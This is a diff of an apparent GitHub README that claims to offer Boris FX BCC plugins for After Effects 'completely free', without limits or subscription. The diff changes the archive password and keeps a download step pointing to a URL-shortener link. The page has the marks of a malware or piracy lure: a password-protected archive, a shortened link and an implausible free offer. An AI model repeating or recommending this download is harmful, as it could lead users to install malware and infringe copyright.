@@ -1,6 +1,6 @@
 # How-To-Get-BCC-Plugin-FREE-In-After-Effects-2026
 🎨 Boris FX BCC Plugin for Windows is a complete set of professional VFX plugins Boris Continuum Complete (BCC) for Windows. Contains hundreds of filters, transitions, and effects for creating cinematic quality. Completely updated for 2026. Completely free. No limits. No subscription. No hidden fees.
-🎨PASS- 123🎨
+🎨PASS- 1111🎨
 <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/2e0ca443-6bdb-4b41-af1d-2f8b7a7bcb9d" />
 🔧 Installation Instructions
 Step 1: Download and unpack LINK - https://clck.su/ihCRG
